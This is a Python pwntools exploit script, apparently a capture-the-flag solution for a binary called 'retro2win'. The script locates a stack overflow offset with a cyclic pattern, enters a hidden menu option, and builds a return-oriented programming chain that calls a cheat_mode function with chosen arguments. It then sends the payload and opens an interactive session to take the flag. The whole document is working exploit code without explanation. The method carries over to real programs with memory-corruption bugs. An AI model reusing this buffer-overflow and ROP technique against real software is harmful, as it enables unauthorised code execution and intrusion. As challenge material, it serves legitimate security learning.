from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and navigate to the cheat code entry
    p = process(exe)
    p.sendlineafter(b'Select an option:', b'1337')
    p.sendlineafter(b'cheatcode:', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('Located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './retro2win'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(64))

# Start program
io = start()

# Navigate through the menu to reach the cheat code entry
io.sendlineafter(b'Select an option:', b'1337')  # Enter hidden option

# ROP object
rop = ROP(elf)
rop.cheat_mode(0x2323232323232323, 0x4242424242424242)

# Build the payload
payload = flat({
    offset: [rop.chain()]
})

pprint(rop.dump())

# Send the payload
io.sendlineafter(b'cheatcode:', payload)

# Get flag
io.interactive()
